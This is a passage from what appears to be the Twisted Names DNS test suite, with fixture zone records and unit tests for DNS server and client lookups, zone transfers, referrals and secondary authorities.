know'),\n            dns.Record_CNAME(b'canonical.name.com'),\n            dns.Record_MB(b'mailbox.test-domain.com'),\n            dns.Record_MG(b'mail.group.someplace'),\n            dns.Record_TXT(b'A First piece of Text', b'a SecoNd piece'),\n            dns.Record_A6(0, b'ABCD::4321', b''),\n            dns.Record_A6(12, b'0:0069::0', b'some.network.tld'),\n            dns.Record_A6(8, b'0:5634:1294:AFCB:56AC:48EF:34C3:01FF',\n                          b'tra.la.la.net'),\n            dns.Record_TXT(b'Some more text, haha!  Yes.  \\0  Still here?'),\n            dns.Record_MR(b'mail.redirect.or.whatever'),\n            dns.Record_MINFO(rmailbx=b'r mail box', emailbx=b'e mail box'),\n            dns.Record_AFSDB(subtype=1, hostname=b'afsdb.test-domain.com'),\n            dns.Record_RP(mbox=b'whatever.i.dunno', txt=b'some.more.text'),\n            dns.Record_WKS(b'12.54.78.12', socket.IPPROTO_TCP,\n                           b'\\x12\\x01\\x16\\xfe\\xc1\\x00\\x01'),\n            dns.Record_NAPTR(100, 10, b\"u\", b\"sip+E2U\",\n                             b\"!^.*$!sip:information@domain.tld!\"),\n            dns.Record_AAAA(b'AF43:5634:1294:AFCB:56AC:48EF:34C3:01FF')],\n        b'http.tcp.test-domain.com': [\n            dns.Record_SRV(257, 16383, 43690, b'some.other.place.fool')\n        ],\n        b'host.test-domain.com': [\n            dns.Record_A(b'123.242.1.5'),\n            dns.Record_A(b'0.255.0.255'),\n        ],\n        b'host-two.test-domain.com': [\n#\n#  Python bug\n#           dns.Record_A('255.255.255.255'),\n#\n            dns.Record_A(b'255.255.255.254'),\n            dns.Record_A(b'0.0.0.0')\n        ],\n        b'cname.test-domain.com': [\n            dns.Record_CNAME(b'test-domain.com')\n        ],\n        b'anothertest-domain.com': [\n            dns.Record_A(b'1.2.3.4')],\n    }\n)\n\nreverse_domain = NoFileAuthority(\n    soa = (b'93.84.28.in-addr.arpa', reverse_soa),\n    records = {\n        b'123.93.84.28.in-addr.arpa': [\n             dns.Record_PTR(b'test.host-reverse.lookup.com'),\n             reverse_soa\n        ]\n    }\n)\n\n\nmy_domain_com = NoFileAuthority(\n    soa = (b'my-domain.com', my_soa),\n    records = {\n        b'my-domain.com': [\n            my_soa,\n            dns.Record_A(b'1.2.3.4', ttl='1S'),\n            dns.Record_NS(b'ns1.domain', ttl=b'2M'),\n            dns.Record_NS(b'ns2.domain', ttl='3H'),\n            dns.Record_SRV(257, 16383, 43690, b'some.other.place.fool',\n                           ttl='4D')\n            ]\n        }\n    )\n\n\nclass ServerDNSTests(unittest.TestCase):\n    \"\"\"\n    Test cases for DNS server and client.\n    \"\"\"\n\n    def setUp(self):\n        self.factory = server.DNSServerFactory([\n            test_domain_com, reverse_domain, my_domain_com\n        ], verbose=2)\n\n        p = dns.DNSDatagramProtocol(self.factory)\n\n        while 1:\n            listenerTCP = reactor.listenTCP(0, self.factory, interface=\"127.0.0.1\")\n            # It's simpler to do the stop listening with addCleanup,\n            # even though we might not end up using this TCP port in\n            # the test (if the listenUDP below fails).  Cleaning up\n            # this TCP port sooner than \"cleanup time\" would mean\n            # adding more code to keep track of the Deferred returned\n            # by stopListening.\n            self.addCleanup(listenerTCP.stopListening)\n            port = listenerTCP.getHost().port\n\n            try:\n                listenerUDP = reactor.listenUDP(port, p, interface=\"127.0.0.1\")\n            except error.CannotListenError:\n                pass\n            else:\n                self.addCleanup(listenerUDP.stopListening)\n                break\n\n        self.listenerTCP = listenerTCP\n        self.listenerUDP = listenerUDP\n        self.resolver = client.Resolver(servers=[('127.0.0.1', port)])\n\n\n    def tearDown(self):\n        \"\"\"\n        Clean up any server connections associated with the\n        L{DNSServerFactory} created in L{setUp}\n        \"\"\"\n        # It'd be great if DNSServerFactory had a method that\n        # encapsulated this task.  At least the necessary data is\n        # available, though.\n        for conn in self.factory.connections[:]:\n            conn.transport.loseConnection()\n\n        return waitUntilAllDisconnected(reactor, self.factory.connections[:])\n\n\n    def namesTest(self, querying, expectedRecords):\n        \"\"\"\n        Assert that the DNS response C{querying} will eventually fire with\n        contains exactly a certain collection of records.\n\n        @param querying: A L{Deferred} returned from one of the DNS client\n            I{lookup} methods.\n\n        @param expectedRecords: A L{list} of L{IRecord} providers which must be\n            in the response or the test will be failed.\n\n        @return: A L{Deferred} that fires when the assertion has been made.  It\n            fires with a success result if the assertion succeeds and with a\n            L{Failure} if it fails.\n        \"\"\"\n        def checkResults(response):\n            receivedRecords = justPayload(response)\n            self.assertEqual(set(expectedRecords), set(receivedRecords))\n\n        querying.addCallback(checkResults)\n        return querying\n\n\n    def test_addressRecord1(self):\n        \"\"\"Test simple DNS 'A' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupAddress('test-domain.com'),\n            [dns.Record_A('127.0.0.1', ttl=19283784)]\n        )\n\n\n    def test_addressRecord2(self):\n        \"\"\"Test DNS 'A' record queries with multiple answers\"\"\"\n        return self.namesTest(\n            self.resolver.lookupAddress('host.test-domain.com'),\n            [dns.Record_A('123.242.1.5', ttl=19283784),\n             dns.Record_A('0.255.0.255', ttl=19283784)]\n        )\n\n\n    def test_addressRecord3(self):\n        \"\"\"Test DNS 'A' record queries with edge cases\"\"\"\n        return self.namesTest(\n            self.resolver.lookupAddress('host-two.test-domain.com'),\n            [dns.Record_A('255.255.255.254', ttl=19283784), dns.Record_A('0.0.0.0', ttl=19283784)]\n        )\n\n\n    def test_authority(self):\n        \"\"\"Test DNS 'SOA' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupAuthority('test-domain.com'),\n            [soa_record]\n        )\n\n\n    def test_mailExchangeRecord(self):\n        \"\"\"\n        The DNS client can issue an MX query and receive a response including\n        an MX record as well as any A record hints.\n        \"\"\"\n        return self.namesTest(\n            self.resolver.lookupMailExchange(b\"test-domain.com\"),\n            [dns.Record_MX(10, b\"host.test-domain.com\", ttl=19283784),\n             dns.Record_A(b\"123.242.1.5\", ttl=19283784),\n             dns.Record_A(b\"0.255.0.255\", ttl=19283784)])\n\n\n    def test_nameserver(self):\n        \"\"\"Test DNS 'NS' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupNameservers('test-domain.com'),\n            [dns.Record_NS('39.28.189.39', ttl=19283784)]\n        )\n\n\n    def test_HINFO(self):\n        \"\"\"Test DNS 'HINFO' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupHostInfo('test-domain.com'),\n            [dns.Record_HINFO(os=b'Linux', cpu=b'A Fast One, Dontcha know',\n                              ttl=19283784)]\n        )\n\n    def test_PTR(self):\n        \"\"\"Test DNS 'PTR' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupPointer('123.93.84.28.in-addr.arpa'),\n            [dns.Record_PTR('test.host-reverse.lookup.com', ttl=11193983)]\n        )\n\n\n    def test_CNAME(self):\n        \"\"\"Test DNS 'CNAME' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupCanonicalName('test-domain.com'),\n            [dns.Record_CNAME('canonical.name.com', ttl=19283784)]\n        )\n\n    def test_MB(self):\n        \"\"\"Test DNS 'MB' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupMailBox('test-domain.com'),\n            [dns.Record_MB('mailbox.test-domain.com', ttl=19283784)]\n        )\n\n\n    def test_MG(self):\n        \"\"\"Test DNS 'MG' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupMailGroup('test-domain.com'),\n            [dns.Record_MG('mail.group.someplace', ttl=19283784)]\n        )\n\n\n    def test_MR(self):\n        \"\"\"Test DNS 'MR' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupMailRename('test-domain.com'),\n            [dns.Record_MR('mail.redirect.or.whatever', ttl=19283784)]\n        )\n\n\n    def test_MINFO(self):\n        \"\"\"Test DNS 'MINFO' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupMailboxInfo('test-domain.com'),\n            [dns.Record_MINFO(rmailbx='r mail box', emailbx='e mail box', ttl=19283784)]\n        )\n\n\n    def test_SRV(self):\n        \"\"\"Test DNS 'SRV' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupService('http.tcp.test-domain.com'),\n            [dns.Record_SRV(257, 16383, 43690, 'some.other.place.fool', ttl=19283784)]\n        )\n\n    def test_AFSDB(self):\n        \"\"\"Test DNS 'AFSDB' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupAFSDatabase('test-domain.com'),\n            [dns.Record_AFSDB(subtype=1, hostname='afsdb.test-domain.com', ttl=19283784)]\n        )\n\n\n    def test_RP(self):\n        \"\"\"Test DNS 'RP' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupResponsibility('test-domain.com'),\n            [dns.Record_RP(mbox='whatever.i.dunno', txt='some.more.text', ttl=19283784)]\n        )\n\n\n    def test_TXT(self):\n        \"\"\"Test DNS 'TXT' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupText('test-domain.com'),\n            [dns.Record_TXT(b'A First piece of Text', b'a SecoNd piece',\n                            ttl=19283784),\n             dns.Record_TXT(b'Some more text, haha!  Yes.  \\0  Still here?',\n                            ttl=19283784)]\n        )\n\n\n    def test_spf(self):\n        \"\"\"\n        L{DNSServerFactory} can serve I{SPF} resource records.\n        \"\"\"\n        return self.namesTest(\n            self.resolver.lookupSenderPolicy('test-domain.com'),\n            [dns.Record_SPF(b'v=spf1 mx/30 mx:example.org/30 -all',\n                            ttl=19283784),\n            dns.Record_SPF(b'v=spf1 +mx a:\\0colo',\n                           b'.example.com/28 -all not valid', ttl=19283784)]\n        )\n\n\n    def test_WKS(self):\n        \"\"\"Test DNS 'WKS' record queries\"\"\"\n        return self.namesTest(\n            self.resolver.lookupWellKnownServices('test-domain.com'),\n            [dns.Record_WKS('12.54.78.12', socket.IPPROTO_TCP,\n                            b'\\x12\\x01\\x16\\xfe\\xc1\\x00\\x01', ttl=19283784)]\n        )\n\n\n    def test_someRecordsWithTTLs(self):\n        result_soa = copy.copy(my_soa)\n        result_soa.ttl = my_soa.expire\n        return self.namesTest(\n            self.resolver.lookupAllRecords('my-domain.com'),\n            [result_soa,\n             dns.Record_A('1.2.3.4', ttl='1S'),\n             dns.Record_NS('ns1.domain', ttl='2M'),\n             dns.Record_NS('ns2.domain', ttl='3H'),\n             dns.Record_SRV(257, 16383, 43690, 'some.other.place.fool', ttl='4D')]\n            )\n\n\n    def test_AAAA(self):\n        \"\"\"Test DNS 'AAAA' record queries (IPv6)\"\"\"\n        return self.namesTest(\n            self.resolver.lookupIPV6Address('test-domain.com'),\n            [dns.Record_AAAA('AF43:5634:1294:AFCB:56AC:48EF:34C3:01FF', ttl=19283784)]\n        )\n\n    def test_A6(self):\n        \"\"\"Test DNS 'A6' record queries (IPv6)\"\"\"\n        return self.namesTest(\n            self.resolver.lookupAddress6('test-domain.com'),\n            [dns.Record_A6(0, 'ABCD::4321', '', ttl=19283784),\n             dns.Record_A6(12, '0:0069::0', 'some.network.tld', ttl=19283784),\n             dns.Record_A6(8, '0:5634:1294:AFCB:56AC:48EF:34C3:01FF', 'tra.la.la.net', ttl=19283784)]\n         )\n\n\n    def test_zoneTransfer(self):\n        \"\"\"\n        Test DNS 'AXFR' queries (Zone transfer)\n        \"\"\"\n        default_ttl = soa_record.expire\n        results = [copy.copy(r) for r in reduce(operator.add, test_domain_com.records.values())]\n        for r in results:\n            if r.ttl is None:\n                r.ttl = default_ttl\n        return self.namesTest(\n            self.resolver.lookupZone('test-domain.com').addCallback(lambda r: (r[0][:-1],)),\n            results\n        )\n\n    def test_zoneTransferConnectionFails(self):\n        \"\"\"\n        A failed AXFR TCP connection errbacks the L{Deferred} returned\n        from L{Resolver.lookupZone}.\n        \"\"\"\n        resolver = Resolver(servers=[(\"nameserver.invalid\", 53)])\n        return self.assertFailure(resolver.lookupZone(\"impossible.invalid\"),\n                                  error.DNSLookupError)\n\n\n    def test_similarZonesDontInterfere(self):\n        \"\"\"Tests that unrelated zones don't mess with each other.\"\"\"\n        return self.namesTest(\n            self.resolver.lookupAddress(\"anothertest-domain.com\"),\n            [dns.Record_A('1.2.3.4', ttl=19283784)]\n        )\n\n\n    def test_NAPTR(self):\n        \"\"\"\n        Test DNS 'NAPTR' record queries.\n        \"\"\"\n        return self.namesTest(\n            self.resolver.lookupNamingAuthorityPointer('test-domain.com'),\n            [dns.Record_NAPTR(100, 10, b\"u\", b\"sip+E2U\",\n                              b\"!^.*$!sip:information@domain.tld!\",\n                              ttl=19283784)])\n\n\n\nclass HelperTests(unittest.TestCase):\n    def test_serialGenerator(self):\n        f = self.mktemp()\n        a = authority.getSerial(f)\n        for i in range(20):\n            b = authority.getSerial(f)\n            self.assertTrue(a < b)\n            a = b\n\n\nclass AXFRTests(unittest.TestCase):\n    def setUp(self):\n        self.results = None\n        self.d = defer.Deferred()\n        self.d.addCallback(self._gotResults)\n        self.controller = client.AXFRController('fooby.com', self.d)\n\n        self.soa = dns.RRHeader(name='fooby.com', type=dns.SOA, cls=dns.IN, ttl=86400, auth=False,\n                                payload=dns.Record_SOA(mname='fooby.com',\n                                                       rname='hooj.fooby.com',\n                                                       serial=100,\n                                                       refresh=200,\n                                                       retry=300,\n                                                       expire=400,\n                                                       minimum=500,\n                                                       ttl=600))\n\n        self.records = [\n            self.soa,\n            dns.RRHeader(name='fooby.com', type=dns.NS, cls=dns.IN, ttl=700, auth=False,\n                         payload=dns.Record_NS(name='ns.twistedmatrix.com', ttl=700)),\n\n            dns.RRHeader(name='fooby.com', type=dns.MX, cls=dns.IN, ttl=700, auth=False,\n                         payload=dns.Record_MX(preference=10, exchange='mail.mv3d.com', ttl=700)),\n\n            dns.RRHeader(name='fooby.com', type=dns.A, cls=dns.IN, ttl=700, auth=False,\n                         payload=dns.Record_A(address='64.123.27.105', ttl=700)),\n            self.soa\n            ]\n\n    def _makeMessage(self):\n        # hooray they all have the same message format\n        return dns.Message(id=999, answer=1, opCode=0, recDes=0, recAv=1, auth=1, rCode=0, trunc=0, maxSize=0)\n\n    def test_bindAndTNamesStyle(self):\n        # Bind style = One big single message\n        m = self._makeMessage()\n        m.queries = [dns.Query('fooby.com', dns.AXFR, dns.IN)]\n        m.answers = self.records\n        self.controller.messageReceived(m, None)\n        self.assertEqual(self.results, self.records)\n\n    def _gotResults(self, result):\n        self.results = result\n\n    def test_DJBStyle(self):\n        # DJB style = message per record\n        records = self.records[:]\n        while records:\n            m = self._makeMessage()\n            m.queries = [] # DJB *doesn't* specify any queries.. hmm..\n            m.answers = [records.pop(0)]\n            self.controller.messageReceived(m, None)\n        self.assertEqual(self.results, self.records)\n\n\n\nclass ResolvConfHandlingTests(unittest.TestCase):\n    def test_missing(self):\n        resolvConf = self.mktemp()\n        r = client.Resolver(resolv=resolvConf)\n        self.assertEqual(r.dynServers, [('127.0.0.1', 53)])\n        r._parseCall.cancel()\n\n    def test_empty(self):\n        resolvConf = self.mktemp()\n        open(resolvConf, 'w').close()\n        r = client.Resolver(resolv=resolvConf)\n        self.assertEqual(r.dynServers, [('127.0.0.1', 53)])\n        r._parseCall.cancel()\n\n\n\nclass AuthorityTests(unittest.TestCase):\n    \"\"\"\n    Tests for the basic response record selection code in L{FileAuthority}\n    (independent of its fileness).\n    \"\"\"\n\n    def test_domainErrorForNameWithCommonSuffix(self):\n        \"\"\"\n        L{FileAuthority} lookup methods errback with L{DomainError} if\n        the requested C{name} shares a common suffix with its zone but\n        is not actually a descendant of its zone, in terms of its\n        sequence of DNS name labels. eg www.the-example.com has\n        nothing to do with the zone example.com.\n        \"\"\"\n        testDomain = test_domain_com\n        testDomainName = b'nonexistent.prefix-' + testDomain.soa[0]\n        f = self.failureResultOf(testDomain.lookupAddress(testDomainName))\n        self.assertIsInstance(f.value, DomainError)\n\n\n    def test_recordMissing(self):\n        \"\"\"\n        If a L{FileAuthority} has a zone which includes an I{NS} record for a\n        particular name and that authority is asked for another record for the\n        same name which does not exist, the I{NS} record is not included in the\n        authority section of the response.\n        \"\"\"\n        authority = NoFileAuthority(\n            soa=(soa_record.mname.name, soa_record),\n            records={\n                soa_record.mname.name: [\n                    soa_record,\n                    dns.Record_NS('1.2.3.4'),\n                    ]})\n        answer, authority, additional = self.successResultOf(\n            authority.lookupAddress(soa_record.mname.name))\n        self.assertEqual(answer, [])\n        self.assertEqual(\n            authority, [\n                dns.RRHeader(\n                    soa_record.mname.name, soa_record.TYPE,\n                    ttl=soa_record.expire, payload=soa_record,\n                    auth=True)])\n        self.assertEqual(additional, [])\n\n\n    def test_unknownTypeNXDOMAIN(self):\n        \"\"\"\n        Requesting a record of unknown type where no records exist for the name\n        in question results in L{DomainError}.\n        \"\"\"\n        testDomain = test_domain_com\n        testDomainName = b'nonexistent.prefix-' + testDomain.soa[0]\n        unknownType = max(common.typeToMethod) + 1\n        f = self.failureResultOf(\n            testDomain.query(Query(name=testDomainName, type=unknownType)))\n        self.assertIsInstance(f.value, DomainError)\n\n\n    def test_unknownTypeMissing(self):\n        \"\"\"\n        Requesting a record of unknown type where other records exist for the\n        name in question results in an empty answer set.\n        \"\"\"\n        unknownType = max(common.typeToMethod) + 1\n        answer, authority, additional = self.successResultOf(\n            my_domain_com.query(\n                Query(name=u'my-domain.com', type=unknownType)))\n        self.assertEqual(answer, [])\n\n\n    def _referralTest(self, method):\n        \"\"\"\n        Create an authority and make a request against it.  Then verify that the\n        result is a referral, including no records in the answers or additional\n        sections, but with an I{NS} record in the authority section.\n        \"\"\"\n        subdomain = b'example.' + soa_record.mname.name\n        nameserver = dns.Record_NS('1.2.3.4')\n        authority = NoFileAuthority(\n            soa=(soa_record.mname.name, soa_record),\n            records={\n                subdomain: [\n                    nameserver,\n                    ]})\n        d = getattr(authority, method)(subdomain)\n        answer, authority, additional = self.successResultOf(d)\n        self.assertEqual(answer, [])\n        self.assertEqual(\n            authority, [dns.RRHeader(\n                    subdomain, dns.NS, ttl=soa_record.expire,\n                    payload=nameserver, auth=False)])\n        self.assertEqual(additional, [])\n\n\n    def test_referral(self):\n        \"\"\"\n        When an I{NS} record is found for a child zone, it is included in the\n        authority section of the response. It is marked as non-authoritative if\n        the authority is not also authoritative for the child zone (RFC 2181,\n        section 6.1).\n        \"\"\"\n        self._referralTest('lookupAddress')\n\n\n    def test_allRecordsReferral(self):\n        \"\"\"\n        A referral is also generated for a request of type C{ALL_RECORDS}.\n        \"\"\"\n        self._referralTest('lookupAllRecords')\n\n\n\nclass AdditionalProcessingTests(unittest.TestCase):\n    \"\"\"\n    Tests for L{FileAuthority}'s additional processing for those record types\n    which require it (MX, CNAME, etc).\n    \"\"\"\n    _A = dns.Record_A(b\"10.0.0.1\")\n    _AAAA = dns.Record_AAAA(b\"f080::1\")\n\n    def _lookupSomeRecords(self, method, soa, makeRecord, target, addresses):\n        \"\"\"\n        Perform a DNS lookup against a L{FileAuthority} configured with records\n        as defined by C{makeRecord} and C{addresses}.\n\n        @param method: The name of the lookup method to use; for example,\n            C{\"lookupNameservers\"}.\n        @type method: L{str}\n\n        @param soa: A L{Record_SOA} for the zone for which the L{FileAuthority}\n            is authoritative.\n\n        @param makeRecord: A one-argument callable which accepts a name and\n            returns an L{IRecord} provider.  L{FileAuthority} is constructed\n            with this record.  The L{FileAuthority} is queried for a record of\n            the resulting type with the given name.\n\n        @param target: The extra name which the record returned by\n            C{makeRecord} will be pointed at; this is the name which might\n            require extra processing by the server so that all the available,\n            useful information is returned.  For example, this is the target of\n            a CNAME record or the mail exchange host pointed to by an MX record.\n        @type target: L{bytes}\n\n        @param addresses: A L{list} of records giving addresses of C{target}.\n\n        @return: A L{Deferred} that fires with the result of the resolver\n            method give by C{method}.\n        \"\"\"\n        authority = NoFileAuthority(\n            soa=(soa.mname.name, soa),\n            records={\n                soa.mname.name: [makeRecord(target)],\n                target: addresses,\n                },\n            )\n        return getattr(authority, method)(soa_record.mname.name)\n\n\n    def assertRecordsMatch(self, expected, computed):\n        \"\"\"\n        Assert that the L{RRHeader} instances given by C{expected} and\n        C{computed} carry all the same information but without requiring the\n        records appear in the same order.\n\n        @param expected: A L{list} of L{RRHeader} instances giving the expected\n            records.\n\n        @param computed: A L{list} of L{RRHeader} instances giving the records\n            computed by the scenario under test.\n\n        @raise self.failureException: If the two collections of records\n            disagree.\n        \"\"\"\n        # RRHeader instances aren't inherently ordered.  Impose an ordering\n        # that's good enough for the purposes of these tests - in which we\n        # never have more than one record of a particular type.\n        key = lambda rr: rr.type\n        self.assertEqual(sorted(expected, key=key), sorted(computed, key=key))\n\n\n    def _additionalTest(self, method, makeRecord, addresses):\n        \"\"\"\n        Verify that certain address records are included in the I{additional}\n        section of a response generated by L{FileAuthority}.\n\n        @param method: See L{_lookupSomeRecords}\n\n        @param makeRecord: See L{_lookupSomeRecords}\n\n        @param addresses: A L{list} of L{IRecord} providers which the\n            I{additional} section of the response is required to match\n            (ignoring order).\n\n        @raise self.failureException: If the I{additional} section of the\n            response consists of different records than those given by\n            C{addresses}.\n        \"\"\"\n        target = b\"mail.\" + soa_record.mname.name\n        d = self._lookupSomeRecords(\n            method, soa_record, makeRecord, target, addresses)\n        answer, authority, additional = self.successResultOf(d)\n\n        self.assertRecordsMatch(\n            [dns.RRHeader(\n                    target, address.TYPE, ttl=soa_record.expire, payload=address,\n                    auth=True)\n             for address in addresses],\n            additional)\n\n\n    def _additionalMXTest(self, addresses):\n        \"\"\"\n        Verify that a response to an MX query has certain records in the\n        I{additional} section.\n\n        @param addresses: See C{_additionalTest}\n        \"\"\"\n        self._additionalTest(\n            \"lookupMailExchange\", partial(dns.Record_MX, 10), addresses)\n\n\n    def test_mailExchangeAdditionalA(self):\n        \"\"\"\n        If the name of the MX response has A records, they are included in the\n        additional section of the response.\n        \"\"\"\n        self._additionalMXTest([self._A])\n\n\n    def test_mailExchangeAdditionalAAAA(self):\n        \"\"\"\n        If the name of the MX response has AAAA records, they are included in\n        the additional section of the response.\n        \"\"\"\n        self._additionalMXTest([self._AAAA])\n\n\n    def test_mailExchangeAdditionalBoth(self):\n        \"\"\"\n        If the name of the MX response has both A and AAAA records, they are\n        all included in the additional section of the response.\n        \"\"\"\n        self._additionalMXTest([self._A, self._AAAA])\n\n\n    def _additionalNSTest(self, addresses):\n        \"\"\"\n        Verify that a response to an NS query has certain records in the\n        I{additional} section.\n\n        @param addresses: See C{_additionalTest}\n        \"\"\"\n        self._additionalTest(\n            \"lookupNameservers\", dns.Record_NS, addresses)\n\n\n    def test_nameserverAdditionalA(self):\n        \"\"\"\n        If the name of the NS response has A records, they are included in the\n        additional section of the response.\n        \"\"\"\n        self._additionalNSTest([self._A])\n\n\n    def test_nameserverAdditionalAAAA(self):\n        \"\"\"\n        If the name of the NS response has AAAA records, they are included in\n        the additional section of the response.\n        \"\"\"\n        self._additionalNSTest([self._AAAA])\n\n\n    def test_nameserverAdditionalBoth(self):\n        \"\"\"\n        If the name of the NS response has both A and AAAA records, they are\n        all included in the additional section of the response.\n        \"\"\"\n        self._additionalNSTest([self._A, self._AAAA])\n\n\n    def _answerCNAMETest(self, addresses):\n        \"\"\"\n        Verify that a response to a CNAME query has certain records in the\n        I{answer} section.\n\n        @param addresses: See C{_additionalTest}\n        \"\"\"\n        target = b\"www.\" + soa_record.mname.name\n        d = self._lookupSomeRecords(\n            \"lookupCanonicalName\", soa_record, dns.Record_CNAME, target,\n            addresses)\n        answer, authority, additional = self.successResultOf(d)\n\n        alias = dns.RRHeader(\n            soa_record.mname.name, dns.CNAME, ttl=soa_record.expire,\n            payload=dns.Record_CNAME(target), auth=True)\n        self.assertRecordsMatch(\n            [dns.RRHeader(\n                    target, address.TYPE, ttl=soa_record.expire, payload=address,\n                    auth=True)\n             for address in addresses] + [alias],\n            answer)\n\n\n    def test_canonicalNameAnswerA(self):\n        \"\"\"\n        If the name of the CNAME response has A records, they are included in\n        the answer section of the response.\n        \"\"\"\n        self._answerCNAMETest([self._A])\n\n\n    def test_canonicalNameAnswerAAAA(self):\n        \"\"\"\n        If the name of the CNAME response has AAAA records, they are included\n        in the answer section of the response.\n        \"\"\"\n        self._answerCNAMETest([self._AAAA])\n\n\n    def test_canonicalNameAnswerBoth(self):\n        \"\"\"\n        If the name of the CNAME response has both A and AAAA records, they are\n        all included in the answer section of the response.\n        \"\"\"\n        self._answerCNAMETest([self._A, self._AAAA])\n\n\n\nclass NoInitialResponseTests(unittest.TestCase):\n\n    def test_noAnswer(self):\n        \"\"\"\n        If a request returns a L{dns.NS} response, but we can't connect to the\n        given server, the request fails with the error returned at connection.\n        \"\"\"\n\n        def query(self, *args):\n            # Pop from the message list, so that it blows up if more queries\n            # are run than expected.\n            return succeed(messages.pop(0))\n\n        def queryProtocol(self, *args, **kwargs):\n            return defer.fail(socket.gaierror(\"Couldn't connect\"))\n\n        resolver = Resolver(servers=[('0.0.0.0', 0)])\n        resolver._query = query\n        messages = []\n        # Let's patch dns.DNSDatagramProtocol.query, as there is no easy way to\n        # customize it.\n        self.patch(dns.DNSDatagramProtocol, \"query\", queryProtocol)\n\n        records = [\n            dns.RRHeader(name='fooba.com', type=dns.NS, cls=dns.IN, ttl=700,\n                         auth=False,\n                         payload=dns.Record_NS(name='ns.twistedmatrix.com',\n                         ttl=700))]\n        m = dns.Message(id=999, answer=1, opCode=0, recDes=0, recAv=1, auth=1,\n                        rCode=0, trunc=0, maxSize=0)\n        m.answers = records\n        messages.append(m)\n        return self.assertFailure(\n            resolver.getHostByName(\"fooby.com\"), socket.gaierror)\n\n\n\nclass SecondaryAuthorityServiceTests(unittest.TestCase):\n    \"\"\"\n    Tests for L{SecondaryAuthorityService}, a service which keeps one or more\n    authorities up to date by doing zone transfers from a master.\n    \"\"\"\n\n    def test_constructAuthorityFromHost(self):\n        \"\"\"\n        L{SecondaryAuthorityService} can be constructed with a C{str} giving a\n        master server address and several domains, causing the creation of a\n        secondary authority for each domain and that master server address and\n        the default DNS port.\n        \"\"\"\n        primary = '192.168.1.2'\n        service = SecondaryAuthorityService(\n            primary, [b'example.com', 'example.org'])\n        self.assertEqual(service.primary, primary)\n        self.assertEqual(service._port, 53)\n\n        self.assertEqual(service.domains[0].primary, primary)\n        self.assertEqual(service.domains[0]._port, 53)\n        self.assertEqual(service.domains[0].domain, b'example.com')\n\n        self.assertEqual(service.domains[1].primary, primary)\n        self.assertEqual(service.domains[1]._port, 53)\n        self.assertEqual(service.domains[1].domain, b'example.org')\n\n\n    def test_constructAuthorityFromHostAndPort(self):\n        \"\"\"\n        L{SecondaryAuthorityService.fromServerAddressAndDomains} constructs a\n        new L{SecondaryAuthorityService} from a C{str} giving a master server\n        address and DNS port and several domains, causing the creation of a secondary\n        authority for each domain and that master server address and the given\n        DNS port.\n        \"\"\"\n        primary = '192.168.1.3'\n        port = 5335\n        service = SecondaryAuthorityService.fromServerAddressAndDomains(\n            (primary, port), ['example.net', b'example.edu'])\n        self.assertEqual(service.primary, primary)\n        self.assertEqual(service._port, 5335)\n\n        self.assertEqual(service.domains[0].primary, primary)\n        self.assertEqual(service.domains[0]._port, port)\n        self.assertEqual(service.domains[0].domain, b'example.net')\n\n        self.assertEqual(service.domains[1].primary, primary)\n        self.assertEqual(service.domains[1]._port, port)\n        self.assertEqual(service.domains[1].domain, b'example.edu')\n\n\n    def test_constructAuthorityFromBytes(self):\n        \"\"\"\n        L{SecondaryAuthorityService.fromServerAddressAndDomains} constructs a\n        new L{SecondaryAuthorityService} from a C{bytes} giving a master server\n        address and several domains, causing the creation of a secondary\n        authority for each domain and that master server address and the given\n        DNS port.\n        \"\"\"\n        primary = '192.168.1.3'\n        service = SecondaryAuthorityService(\n            primary.encode(),\n            [b'example.net', 'example.edu'],  # Coerced to bytes.\n        )\n        self.assertEqual(service.primary, primary)\n\n        self.assertEqual(service.domains[0].primary, primary)\n        self.assertEqual(service.domains[0].domain, b'example.net')\n\n        self.assertEqual(service.domains[1].primary, primary)\n        self.assertEqual(service.domains[1].domain, b'example.edu')\n\n\n\nclass SecondaryAuthorityTests(unittest.TestCase):\n    \"\"\"\n    L{twisted.names.secondary.SecondaryAuthority} correctly constructs objects\n    with a specified IP address and optionally specified DNS port.\n    \"\"\"\n\n    def test_defaultPort(self):\n        \"\"\"\n        When constructed using L{SecondaryAuthority.__init__}, the default port\n        of 53 is used.\n        \"\"\"\n        secondary = SecondaryAuthority('192.168.1.1', 'inside.com')\n        self.assertEqual(secondary.primary, '192.168.1.1')\n        self.assertEqual(secondary._port, 53)\n        self.assertEqual(secondary.domain, b'inside.com')\n\n\n    def test_explicitPort(self):\n        \"\"\"\n        When constructed using L{SecondaryAuthority.fromServerAddressAndDomain},\n        the specified port is used.\n        \"\"\"\n        secondary = SecondaryAuthority.fromServerAddressAndDomain(\n            ('192.168.1.1', 5353), 'inside.com')\n        self.assertEqual(secondary.primary, '192.168.1.1')\n        self.assertEqual(secondary._port, 5353)\n        self.assertEqual(secondary.domain, b'inside.com')\n\n\n    def test_transfer(self):\n        \"\"\"\n        An attempt is made to transfer the zone for the domain the\n        L{SecondaryAuthority} was constructed with from the server address it\n        was constructed with when L{SecondaryAuthority.transfer} is called.\n        \"\"\"\n        secondary = SecondaryAuthority.fromServerAddressAndDomain(\n            ('192.168.1.2', 1234), 'example.com')\n        secondary._reactor = reactor = MemoryReactorClock()\n\n        secondary.transfer()\n\n        # Verify a connection attempt to the server address above\n        host, port, factory, timeout, bindAddress = reactor.tcpClients.pop(0)\n        self.assertEqual(host, '192.168.1.2')\n        self.assertEqual(port, 1234)\n\n        # See if a zone transfer query is issued.\n        proto = factory.buildProtocol((host, port))\n        transport = StringTransport()\n        proto.makeConnection(transport)\n\n        msg = Message()\n        # DNSProtocol.writeMessage length encodes the message by prepending a\n        # 2 byte message length to the buffered value.\n        msg.decode(BytesIO(transport.value()[2:]))\n\n        self.assertEqual(\n            